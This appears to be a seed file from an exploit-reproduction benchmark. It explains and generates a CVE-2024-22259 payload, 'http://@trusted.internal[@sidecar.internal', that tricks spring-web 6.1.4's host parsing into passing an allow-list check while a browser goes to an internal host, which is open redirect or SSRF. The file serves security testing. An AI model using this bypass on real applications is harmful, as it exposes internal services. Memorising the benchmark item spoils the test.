#!/usr/bin/env python3
"""[GIVEN] CVE-2024-22259 seed -- open-redirect/SSRF via UriComponentsBuilder
host parsing. This is the SEED for THIS case (the CVE-2024-22262 target): the
CVE-2024-22259 residual that reaches the flag on V0 (spring-web 6.1.4) and is
CLOSED on V1 (spring-web 6.1.5, the CVE-2024-22259 fix).

The application guard extracts the host with
    host = UriComponentsBuilder.fromUriString(url).build().getHost()
and only redirects/fetches when host is in the allow-list {trusted.internal}.

CVE-2024-22259 payload:

    http://@trusted.internal[@sidecar.internal

On V0 = spring-web 6.1.4 the USERINFO_PATTERN "([^@/?#]*)" matches EMPTY at the
leading '@' (consumed by the '(userinfo@)?' group), the scan restarts at
'trusted.internal[...' where HOST_IPV4 = "[^\\[/?#:]*" (excludes '[') matches
'trusted.internal' and STOPS at '['. => getHost() == 'trusted.internal'
(ALLOW-LISTED), guard passes. A real browser (WHATWG URL parser) splits userinfo
at the LAST '@' and navigates to 'sidecar.internal' -> open redirect / SSRF.

Contract (verified on real Docker via oracle.py):
    * V0 = spring-web 6.1.4 -> getHost()=trusted.internal (guard passes); real
                              navigation reaches sidecar.internal -> ${PCB_FLAG}. REACHES.
    * V1 = spring-web 6.1.5 -> CVE-2024-22259 fix: USERINFO now allows '@'
                              ("([^/?#]*)") so it swallows '@trusted.internal[' up to
                              the last '@'; HOST=sidecar.internal =>
                              getHost()=sidecar.internal (NOT allow-listed) -> guard
                              BLOCKS. BLOCKED.

The per-run ${PCB_FLAG} lives only in the internal sidecar's response body.
"""
from __future__ import annotations

ALLOWLISTED = "trusted.internal"   # the app allow-list entry (defended boundary)
ATTACKER = "sidecar.internal"      # internal attacker host the flag sidecar answers on


def url() -> str:
    """CVE-2024-22259 leading-'@' bracket payload: getHost()=trusted.internal on
    V0, but the real navigation host is sidecar.internal."""
    return f"http://@{ALLOWLISTED}[@{ATTACKER}"


def candidate() -> dict:
    return {"id": "cve-2024-22259-leading-at-bracket", "url": url()}


if __name__ == "__main__":
    import json
    print(json.dumps(candidate(), indent=2))
